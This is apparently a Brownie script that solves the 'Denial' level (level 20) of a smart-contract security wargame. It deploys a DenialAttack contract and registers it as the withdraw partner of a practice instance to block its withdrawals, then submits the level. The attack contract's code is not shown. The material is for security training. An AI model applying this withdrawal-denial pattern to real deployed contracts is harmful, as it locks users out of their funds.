from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    DenialAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=20, player=player, value=Web3.toWei(0.001, "ether"))

    denial_contract = interface.IDenial(instance_address)
    attack_contract = DenialAttack.deploy({"from": player})

    tx = denial_contract.setWithdrawPartner(attack_contract, {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
